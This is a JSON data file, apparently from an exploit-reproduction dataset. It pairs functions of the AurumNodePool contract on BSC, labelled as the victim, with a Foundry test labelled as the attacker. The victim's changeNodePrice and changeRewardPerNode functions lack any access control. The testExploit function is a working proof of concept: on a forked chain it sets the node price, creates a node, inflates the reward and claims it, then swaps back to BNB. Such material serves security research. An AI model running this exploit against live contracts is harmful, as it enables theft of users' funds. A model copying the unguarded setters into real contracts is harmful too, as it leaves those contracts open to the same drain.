[
  {
    "contract/interface": "IAurumNodePool",
    "source_type": "victim_contract",
    "function_name": "changeNodePrice",
    "original_code": "    function changeNodePrice(uint256 newNodePrice) external {\n        nodePrice = newNodePrice;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAurumNodePool",
    "source_type": "victim_contract",
    "function_name": "changeRewardPerNode",
    "original_code": "    function changeRewardPerNode(uint256 _rewardPerDay) external {        \n        rewardPerDay = _rewardPerDay;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAurumNodePool",
    "source_type": "victim_contract",
    "function_name": "claimNodeReward",
    "original_code": "    function claimNodeReward(uint256 _creationTime) external {\n        address account = msg.sender;\n        require(_creationTime > 0, \"NODE: CREATIME must be higher than zero\");\n        NodeEntity[] storage nodes = _nodesOfUser[account];\n        uint256 numberOfNodes = nodes.length;\n        require(\n            numberOfNodes > 0,\n            \"CLAIM ERROR: You don't have nodes to claim\"\n        );\n        NodeEntity storage node = _getNodeWithCreatime(nodes, _creationTime);\n        uint256 rewardNode = getNodeReward(node);\n        node.lastClaimTime = block.timestamp;\n        AURUM.transfer(account, rewardNode);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAurumNodePool",
    "source_type": "victim_contract",
    "function_name": "createNode",
    "original_code": "    function createNode(uint256 count) external {\n        require(count > 0, \"Count should be not 0\");\n        address account = msg.sender;\n        require(nodeOwners[account] + count <= maxNodes, \"Count Limited\");\n\n        uint256 price = nodePrice * count;\n        uint256 operationsPrice = price*teamFee/feeDenomiator;\n\n        AURUM.transferFrom(account, address(this), price);\n        AURUM.transfer(teamWallet, operationsPrice);  \n\n        for (uint256 i = 0; i < count; i ++) {\n            _nodesOfUser[account].push(\n                NodeEntity({\n                    nodeId: (totalNodesCreated + 1),\n                    creationTime: block.timestamp + i,\n                    lastClaimTime: block.timestamp + i\n                })\n            );\n            nodeOwners[account]++;\n            totalNodesCreated++;\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAurumNodePool",
    "source_type": "victim_contract",
    "function_name": "getNodes",
    "original_code": "    function getNodes(address account) external view returns(NodeEntity[] memory nodes) {\n        nodes = _nodesOfUser[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IAurumNodePool",
    "source_type": "victim_contract",
    "function_name": "getRewardAmountOf",
    "original_code": "    function getRewardAmountOf(address account, uint256 creationTime) external view returns (uint256) {\n        require(isNodeOwner(account), \"GET REWARD OF: NO NODE OWNER\");\n\n        require(creationTime > 0, \"NODE: CREATIME must be higher than zero\");\n        NodeEntity[] storage nodes = _nodesOfUser[account];\n        uint256 numberOfNodes = nodes.length;\n        require(\n            numberOfNodes > 0,\n            \"CLAIM ERROR: You don't have nodes to claim\"\n        );\n        NodeEntity storage node = _getNodeWithCreatime(nodes, creationTime);        \n        uint256 nodeReward = getNodeReward(node);\n        return nodeReward;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23_282_134);\n        cheats.deal(address(this), 0.01 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        AUR.approve(address(AurumNodePool), type(uint256).max);\n        AUR.approve(address(Router), type(uint256).max);\n\n        emit log_named_decimal_uint(\"[Start] Attacker BNB balance before exploit\", address(this).balance, 18);\n\n        BNBtoAUR(0.01 ether);\n\n        AurumNodePool.changeNodePrice(1_000_000_000_000_000_000_000);\n        AurumNodePool.createNode(1);\n\n        IAurumNodePool.NodeEntity[] memory nodes = AurumNodePool.getNodes(address(this));\n\n        cheats.roll(23_282_171);\n        cheats.warp(1_669_141_486);\n\n        AurumNodePool.changeRewardPerNode(434_159_898_144_856_792_986_061_626_032);\n\n        emit log_named_uint(\n            \"AurumNodePool Attacker reward:\", AurumNodePool.getRewardAmountOf(address(this), nodes[0].creationTime)\n        );\n\n        require(block.timestamp > nodes[0].lastClaimTime);\n\n        AurumNodePool.claimNodeReward(nodes[0].creationTime);\n\n        AURtoBNB();\n\n        emit log_named_decimal_uint(\"[End] Attacker BNB balance after exploit\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  }
]